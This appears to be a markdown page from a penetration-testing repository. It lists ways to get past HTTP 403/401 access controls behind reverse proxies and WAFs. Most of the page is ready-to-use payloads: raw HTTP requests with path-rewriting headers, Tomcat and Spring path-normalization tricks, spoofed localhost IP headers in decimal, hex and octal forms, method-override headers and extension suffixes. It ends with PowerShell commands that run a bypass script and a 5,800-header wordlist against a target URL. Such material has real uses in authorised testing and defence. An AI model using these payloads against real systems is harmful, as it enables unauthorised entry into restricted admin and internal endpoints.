# Mechanism: HTTP 403/401 Forbidden & Reverse Proxy Access Control Bypass

## 1. Architectural Vulnerability Profile
*   **Vulnerability Class:** Reverse Proxy & WAF Path Discrepancy / Missing Origin Enforcement / Authorization Header Spoofing
*   **STRIDE Category:** Elevation of Privilege, Security Misconfiguration, Tampering
*   **Trust Boundary Crossed:** External Client $\rightarrow$ Reverse Proxy / WAF (Routing & ACL Rules) $\rightarrow$ Backend Application Server (Servlet / Reverse Router / FastCGI)
*   **Target Architectures:** Nginx/HAProxy/Cloudflare sitting in front of Spring Boot, Apache Tomcat, Node.js Express, Rails, Django, or Envoy gateways.

---

## 2. Core Failure Modes & Bypass Matrix

When reverse proxies enforce access control lists (ACLs) based strictly on URL paths (e.g., blocking `/admin` or `/api/internal`), inconsistencies between how the proxy and the backend parse URLs allow attackers to circumvent the ACL while the backend still routes to the restricted resource.

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│              مصفوفة تجاوز قيود الوصول (403 Forbidden / 401 Unauthorized)           │
├─────────────────────────┬─────────────────────────────────────────────────────────┤
│ 1. Header Overrides     │ • X-Original-URL / X-Rewrite-URL / X-Custom-IP-Auth     │
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 2. Path Normalization   │ • ..;/ (Tomcat) / %2e / // / ; / %09 / /%20             │
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 3. Method Tunneling     │ • X-HTTP-Method-Override / _method / POST -> PUT/TRACE  │
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 4. Case & Unicode       │ • /ADMIN / /%c0%afadmin / /admin.json / /admin/         │
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 5. Client IP Spoofing   │ • True-Client-IP / X-Forwarded-For: 127.0.0.1 / 10.0.0.1 │
└─────────────────────────┴─────────────────────────────────────────────────────────┘
```

---

## 3. High-Impact Bypass Vectors

### Vector 1: Request URL Rewriting Headers
Certain reverse proxies and frameworks (notably Symfony, Spring, Zend, IIS ARR) allow clients to override the requested path via proprietary headers:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Forwarded-Prefix: /admin
```
*   *Proxy behavior:* Proxy inspects `GET /` and allows it (public route).
*   *Backend behavior:* Backend server reads `X-Original-URL: /admin/users` and routes internal execution directly to the admin handler!

---

### Vector 2: Reverse Proxy Path Traversal & Matrix Parameters
Different web application servers parse URI matrix parameters and semicolons differently:

| Target Backend | Bypass URI Pattern | Parsing Mechanism |
| :--- | :--- | :--- |
| **Apache Tomcat** | `/anything/..;/admin` | Tomcat strips `;` and resolves traversal internally to `/admin`, while Nginx treats `/..;/` as a regular directory name. |
| **Spring Boot** | `/admin;foo=bar/` or `/admin;/` | Spring path matching strips matrix variables `;`, while edge WAF regex matches exact string `/admin$`. |
| **Nginx + PHP-FPM** | `/admin.php/test` or `/admin%20` | FastCGI splits `SCRIPT_FILENAME` at `.php`, executing `/admin.php` while proxy rules fail to match. |
| **IIS / ASP.NET** | `/admin::$DATA` or `/admin/test.aspx` | Alternate Data Streams (ADS) and wildcard handlers expose raw scripts or bypass URL routing rules. |
| **General Web Servers** | `//admin//`, `/./admin/./`, `/%2e/admin` | Path normalization discrepancies between edge normalizer and application router. |

---

### Vector 3: Client-IP & Trusted Network Spoofing
Many internal panels, metrics endpoints (`/metrics`, `/actuator`), and staging routes are restricted by IP address. If the reverse proxy trusts upstream client headers blindly:

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 10.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Client-IP: 127.0.0.1
Base-Url: 127.0.0.1
```

*Alternative IP Notations (Bypassing naive string filters):*
*   `2130706433` (Decimal representation of `127.0.0.1`)
*   `0x7f000001` (Hexadecimal representation)
*   `0177.0000.0000.0001` (Octal representation)
*   `127.1` (Shorthand notation)
*   `::ffff:127.0.0.1` or `[::1]` (IPv6 localhost)

---

### Vector 4: HTTP Verb Tunneling & Method Tampering
Web Application Firewalls often restrict sensitive endpoints for specific verbs (`DELETE`, `PUT`, `POST`), or edge proxies enforce rules only on `GET /admin`:

```http
POST /admin/delete-user HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
X-Method-Override: GET
X-HTTP-Method: GET
_method: GET
Content-Type: application/x-www-form-urlencoded

_method=GET
```
*   Test with unusual HTTP verbs: `TRACE`, `CONNECT`, `DEBUG`, `TRACK`, `PROPFIND`, `OPTIONS`, `HEAD`.

---

### Vector 5: Content Negotiation & Extension Appending
If `/admin` returns `403 Forbidden`:
*   Append extensions: `/admin.json`, `/admin.xml`, `/admin.html`, `/admin.ico`, `/admin/`
*   Add path suffixes: `/admin?`, `/admin#`, `/admin/*`, `/admin..;/`
*   Header variations:
    ```http
    Accept: application/json, text/javascript, */*; q=0.01
    Content-Type: application/json
    ```

---

## 4. Systematic Verification Protocol

1. **Baseline Target:** Record baseline HTTP status, response body byte count, and response headers for `GET /forbidden-endpoint`.
2. **Execute Fast Automation Probe:**
   ```powershell
   pwsh ./scripts/test_403_bypasses.ps1 -TargetUrl "https://target.com/admin" -BaselineStatus 403
   ```
3. **Execute Deep Extended Probe (5,800+ Headers):**
   Using the repository's curated header wordlist:
   ```powershell
   pwsh ./scripts/test_403_bypasses.ps1 -TargetUrl "https://target.com/admin" -Extended -Wordlist "payloads/headers/403_bypass_headers.txt"
   ```
4. **Analyze Differentials:**
   - Any status code transition from `403` to `200`, `302`, `400`, or `500`.
   - Any significant response length differential ($> 100$ bytes).
   - Any new response headers (e.g. `Set-Cookie`, `Location: /admin/dashboard`).

---

## 5. Artifacts & Wordlists
*   **Curated Header Wordlist:** [`payloads/headers/403_bypass_headers.txt`](../../payloads/headers/403_bypass_headers.txt) (Contains 5,865 active reverse proxy rewrite and authorization headers).
